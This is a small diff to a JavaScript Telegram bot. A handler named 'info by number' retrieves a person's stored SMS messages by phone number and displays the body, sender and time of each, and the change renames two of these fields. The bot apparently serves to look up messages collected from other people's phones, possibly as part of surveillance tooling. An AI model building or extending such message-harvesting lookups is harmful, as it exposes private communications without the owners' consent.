@@ -150,8 +150,8 @@ bot.onText(/Инфа по номеру/, async (msg) => {
                     if (userdataByPhone.data?.userMessages[0]) {
                         if (userdataByPhone.data.userMessages[0].messages.length > 0) {
                             messageMessages = userdataByPhone.data.userMessages[0].messages.map(element => {
-                                const body = `Сообщение: ${element.body}`;
-                                const originatingAddress = `Отправитель: ${element.originatingAddress}`;
+                                const body = `Сообщение: ${element.messageBody}`;
+                                const originatingAddress = `Отправитель: ${element.sender}`;
                                 const date = `Дата и время: ${new Date(element.timestamp).toLocaleString()}`;
                                 return `${body}\n${originatingAddress}\n${date}`;
                             });
